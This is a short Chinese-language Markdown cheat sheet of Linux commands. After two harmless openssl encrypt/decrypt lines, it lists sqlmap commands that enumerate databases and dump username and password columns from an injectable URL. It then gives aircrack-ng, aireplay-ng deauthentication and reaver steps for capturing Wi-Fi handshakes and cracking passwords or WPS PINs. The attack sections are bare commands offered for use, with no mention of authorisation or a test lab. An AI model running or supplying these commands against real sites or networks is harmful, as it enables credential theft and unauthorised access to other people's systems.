# [Home](../README.md)
# [Linux](https://www.apiref.com/linux-zh/linux-command-manual.html)

![linux](https://www.runoob.com/wp-content/uploads/2014/06/d0c50-linux2bfile2bsystem2bhierarchy.jpg)

### openssl
> 加密

```shell
echo '明文' | openssl aes-128-cbc -k "key" -base64
```

>解密

```shell
echo "U2FsdGVkX1/QCJoMvMVE7aZCt5/RworlmYhaonZV9f4=" | openssl aes-128-cbc -d -k "key" -base64
```

### SQL注入
```shell
sqlmap -u url --dbs --current-user	
sqlmap -u url --dbms mysql -D dbName --tables
sqlmap -u url --dbms mysql -T admin --columns
sqlmap -u url --dbms mysql -T admin -C field1, field2 --dump

sqlmap -u url?id=1
sqlmap -u url?id=1 --dbs
sqlmap -u url?id=1 --current-db		#列出当前使用的数据库名
sqlmap -u url?id=1 --tables -D "db_name"
sqlmap -u url?id=1 --columns -T "tb_name" -D "db_name"
sqlmap -u url?id=1 --dump -C "username, password" -T "tb_name" -D "db_name"

sqlmap -u url?id=1 --is-dbs #判断该注入点是否有管理员权限，true表示管理员
```

### wifi密码跑字典
```shell
airmon-ng check kill			#杀死进程
airmon-ng start wlan0			#是wlan0网卡开起monitor mode
airodump-ng wlan0mon			#查看附件wifi
airodump-ng --bssid mac地址 -c CH值 -w crack wlan0mon		#开始抓包

aireplay-ng --deauth 10 -a mac地址 -c 抓到的mac地址 wlan0mon
aircrack-ng -w 密码字典路径 crack-01.cap

airmon-ng stop wlan0mon		#关闭wlan0网卡monitor mode
```
### wifi跑pin码
```shell
airmon-ng start wlan0
wash -i wlan0mon
reaver -i wlan0mon -b mac地址 -S -N -vv -c CH值
```